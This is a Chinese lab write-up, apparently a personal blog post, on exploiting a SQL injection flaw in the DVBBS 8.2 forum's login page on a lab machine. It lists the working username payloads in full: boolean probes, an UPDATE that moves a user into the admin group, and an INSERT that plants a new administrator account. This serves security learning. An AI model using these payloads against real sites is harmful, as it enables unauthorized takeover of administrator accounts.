---
layout: post
title: "动网论坛8.2经典注入漏洞利用"
description: "动网论坛8.2经典注入漏洞利用"
tag: web 安全
---

<br />

---

<br />

## **实验目的:**

##### &nbsp;&nbsp;&nbsp;1.理解动网8.2版本注入漏洞的利用原理

<br />

## **实验原理:**

##### &nbsp;&nbsp;&nbsp; 动网8.2在用户登录时，过滤不严，可以导致注入，提升权限。漏洞存在于源程序的login.asp文件。

<br />

## **实验步骤:**

<b>●</b>打开IE，在浏览器中输入 <code>http://192.168.1.3:8010/</code> ,打开动网论坛，并注册一个账户，用户名为"san"，密码为"123456"

<img src="/files/dvbbs 8.2 classic injection vulnerability utilization/1.png" width="400px" height="180px">

<br />

<b>○</b>然后退出，打开登录界面，使用以下语句登录，用户名 <code>san 'and' a '=' a</code>,密码"1234567",此时登录显示用户名或密码错误

<img src="/files/dvbbs 8.2 classic injection vulnerability utilization/2.png" width="300px" height="160px">

<br />

<b>●</b>再使用以下语句登录，用户名 <code>san 'and' a '=' b</code>，密码"1234567"

<img src="/files/dvbbs 8.2 classic injection vulnerability utilization/3.png" width="300px" height="160px">

<br />

<b>○</b>提示用户不存在，说明上面两个语句起作用了，输入语句

<code>';update dv_user set usergroupid=1 where username='san'--</code>

<img src="/files/dvbbs 8.2 classic injection vulnerability utilization/4.png" width="300px" height="160px">

<br />

<b>●</b>此时又提示用户不存在，但是使用用户名"san",密码"123456"登录后可发现"san"用户已属于管理组用户

<img src="/files/dvbbs 8.2 classic injection vulnerability utilization/5.png" width="450px" height="180px">

<br />

<b>○</b>退出，使用以下语句作为用户名，密码为"123456"

```SQL
san';insert intodv_ admin (username,password,flag,adduser) //空格,没有换行//
values('san','49ba59abbe56e057','1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19, 20,21,22 ,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45','san'' )--
```

注意:49ba59abbe56e057是123456的cmd16位密文

<img src="/files/dvbbs 8.2 classic injection vulnerability utilization/6.png" width="300px" height="160px">

<br />

<b>●</b>在地址栏输入 <code>http://192.168.1.3:8001/admin</code> 进入管理员界面，使用"san"及"123456"登录，可以发现登录成功

<img src="/files/dvbbs 8.2 classic injection vulnerability utilization/7.png" width="200px" height="130px">

<br />

<b>○</b>进入到后台后，可以看到san用户已经是管理员

<img src="/files/dvbbs 8.2 classic injection vulnerability utilization/8.png" width="400px" height="180px">

<br />

## **实验总结:**

这次实验对注入漏洞有了个大概的了解，对其注入原理也有了个大概的印象;

要完全理解那些注入语句的含义，还是要看看SQL语句相关知识，了解一下数据库。

